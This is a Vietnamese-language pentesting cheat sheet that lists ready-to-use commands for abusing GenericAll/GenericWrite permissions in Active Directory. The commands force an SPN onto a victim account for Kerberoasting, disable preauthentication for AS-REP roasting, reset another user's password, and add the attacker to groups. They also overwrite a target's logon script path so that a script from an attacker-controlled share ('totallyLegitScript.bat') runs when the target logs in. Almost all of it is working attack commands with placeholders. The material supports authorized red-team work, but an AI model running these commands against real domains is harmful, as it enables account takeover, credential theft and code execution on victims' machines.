# GenericAll/GenericWrite

## User/Computer

### Kerberoasting

Thiết lập SPN cho tài khoản nạn nhân, yêu cầu Service Ticket (ST), lấy hash và kerberoast

#### Windows/Linux

Kiểm tra quyền ghi trên các tài khoản người dùng trong AD:

{% code overflow="wrap" %}

```
bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName'
```

{% endcode %}

Kiểm tra xem tài khoản người dùng có được thiết lập Service Principal Name (SPN) không:

{% code overflow="wrap" %}

```
bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get object <targetuser> --attr serviceprincipalname
```

{% endcode %}

Ép thiết lập SPN cho tài khoản người dùng mục tiêu:

{% code overflow="wrap" %}

```
bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set object <targetuser> serviceprincipalname -v 'ops/whatever1'
```

{% endcode %}

Lấy ticket:

```
GetUsersSPNs.py -dc-ip <ip> '<domain>/<user>:<password>' -request-user <targetuser>
```

#### Windows Only

Kiểm tra quyền ghi trên các tài khoản người dùng trong AD:

```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

Kiểm tra xem tài khoản người dùng có được thiết lập Service Principal Name (SPN) không:

```
Get-DomainUser -Identity <targetuser> | select serviceprincipalname
```

Ép thiết lập SPN cho tài khoản người dùng mục tiêu:

```
Set-DomainObject <targetuser> -Set @{serviceprincipalname='ops/whatever1'}
```

Lấy ticket:

```
$User = Get-DomainUser <targetuser> 
$User | Get-DomainSPNTicket | fl
```

### AS-REP Roasting

Tắt Kerberos preauthentication, lấy AS-REP rồi crack chúng

#### Windows/Linux

Thay đổi userAccountControl:

{% code overflow="wrap" %}

```
bloodyAD --host <ip> -d <domain> -u <attackeruser> -p <password> add uac <targetuser> -f DONT_REQ_PREAUTH
```

{% endcode %}

Lấy ticket:

```
GetNPUsers.py <domain>/<targetuser> -format <hashcat|john> -outputfile <outputfile>
```

#### Windows Only

Thay đổi userAccountControl:

```
Get-DomainUser <targetuser> | ConvertFrom-UACValue
Set-DomainObject -Identity <targetuser> -XOR @{useraccountcontrol=4194304} -Verbose
```

Lấy ticket:

```
Get-DomainUser <targetuser> | ConvertFrom-UACValue
Get-ASREPHash -Domain <domain>.local -UserName <targetuser>
```

### Đặt lại mật khẩu user

#### Windows/Linux

{% code overflow="wrap" %}

```
bloodyAD --host <ip> -d <domain> -u <attackeruser> -p :<hash> set password <targetuser> '<newpassword>'
```

{% endcode %}

#### Windows Only

```
net user <user> <pass> /domain
```

{% code overflow="wrap" %}

```
$user = '<domain>\<user>'
$pass = ConvertTo-SecureString '<userpassword>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential $user, $pass
$newpass = ConvertTo-SecureString '<newpassword>' -AsPlainText -Force
Set-DomainUserPassword -Identity '<domain>\<targetuser>' -AccountPassword $newpass -Credential $creds
```

{% endcode %}

#### Linux Only

{% code overflow="wrap" %}

```
rpcclient -U '<attackeruser>%<pass>' -W <domain> -c "setuserinfo2 <targetuser> 23 <newpass>"
```

{% endcode %}

### Ghi đè Script-Path

Lệnh này ghi đè đường dẫn script đăng nhập của tài khoản mục tiêu để thực thi một script độc hại khi người dùng đăng nhập, cho phép thực thi mã tùy ý.

#### Windows/Linux

{% code overflow="wrap" %}

```
bloodyAD --host <ip> -d <domain> -u <attackeruser> -p '<pass>' set object <targetuser> scriptpath -v '\\<ip>\totallyLegitScript.bat'
```

{% endcode %}

#### Windows Only

{% code overflow="wrap" %}

```
Set-ADObject -SamAccountName <targetuser> -PropertyName scriptpath -PropertyValue "\\<ip>\totallyLegitScript.bat"
```

{% endcode %}

## Group

#### Windows/Linux

Lệnh này thêm tài khoản người dùng vào nhóm trong Active Directory:

{% code overflow="wrap" %}

```
bloodyAD --host <ip> -d <domain> -u <attackeruser> -p <password> add groupMember <group> <attackeruser>
```

{% endcode %}

#### Windows Only

Lệnh này sử dụng lệnh net để thêm tài khoản người dùng vào nhóm, nâng cao quyền hạn:

```
net group <group> <attackeruser> /add /domain
```

#### Linux Only

Lệnh này sử dụng bộ công cụ Samba để thêm tài khoản vào một nhóm cụ thể:

{% code overflow="wrap" %}

```
net rpc group ADDMEM "<groupname>" <usertocadd> -U '<attackeruser>%<password>' -W <domain> -I <ip>
```

{% endcode %}
